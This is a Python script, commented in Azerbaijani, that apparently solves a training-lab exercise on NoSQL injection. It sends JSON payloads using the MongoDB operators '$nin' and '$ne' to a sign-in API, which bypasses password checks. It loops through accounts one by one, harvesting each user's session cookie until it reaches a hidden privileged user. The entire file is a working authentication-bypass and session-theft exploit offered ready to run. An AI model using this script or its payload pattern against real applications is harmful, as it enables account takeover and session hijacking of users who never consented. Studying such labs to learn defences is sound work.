import requests
import json

# URL və Header-lər
url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"

headers = {
    "User-Agent": "Mozilla/5.0 (Python Script)",
    "Content-Type": "application/json",
    "Origin": "http://web0x01.hbtn",
    "Referer": "http://web0x01.hbtn/a3/nosql_injection/"
}

# Tapılan istifadəçiləri burada yadda saxlayacağıq ki, təkrar gəlməsinlər
known_users = []

print(f"[*] Bütün istifadəçilərin Cookie-ləri çıxarılır...\n")
print(f"{'USERNAME':<20} | {'COOKIE (SESSION)':<50}")
print("-" * 75)

while True:
    # Payload: Bildiyimiz istifadəçiləri istisna edirik ($nin)
    payload = {
        "username": {"$nin": known_users},
        "password": {"$ne": ""}
    }

    try:
        # Sorğunu göndər
        r = requests.post(url, json=payload, headers=headers)
        
        # Cookie-ni götür
        cookie_val = r.cookies.get("session")
        
        if not cookie_val:
            print("\n[!] Cookie tapılmadı və ya siyahı bitdi.")
            break

        # JSON cavabını oxu
        data = r.json()
        
        # İstifadəçi adını tapmağa çalışırıq
        current_user = None
        
        if data.get("status") == "success":
            msg = data.get("message")
            
            # Hal 1: Normal istifadəçi (Adı görünür)
            if isinstance(msg, dict):
                current_user = msg.get("username")
                
            # Hal 2: Gizli istifadəçi (Adı yoxdur, sadəcə təbrik mesajı var)
            elif isinstance(msg, str):
                current_user = "UNKNOWN_VIP" 
                print(f"{current_user:<20} | {cookie_val}")
                print(f"\n[!!!] DİQQƏT: 'UNKNOWN_VIP' tapıldı (Böyük ehtimalla hədəf budur).")
                print(f"[!!!] Bu Cookie-ni yoxla: session={cookie_val}")
                # Adını bilmədiyimiz üçün onu $nin siyahısına sala bilmirik, dövr burada bitir
                break

        # Əgər istifadəçi adı gəldisə və biz onu artıq bilmiriksə
        if current_user and current_user not in known_users:
            print(f"{current_user:<20} | {cookie_val}")
            known_users.append(current_user)
        else:
            # Əgər eyni adam təkrar gəlirsə və ya ad yoxdursa, deməli bitdi
            break

    except Exception as e:
        print(f"\n[!] Xəta baş verdi: {e}")
        break

print("\n[*] Siyahı tamamlandı.")
print(f"[*] Cəmi {len(known_users)} istifadəçi tapıldı.")
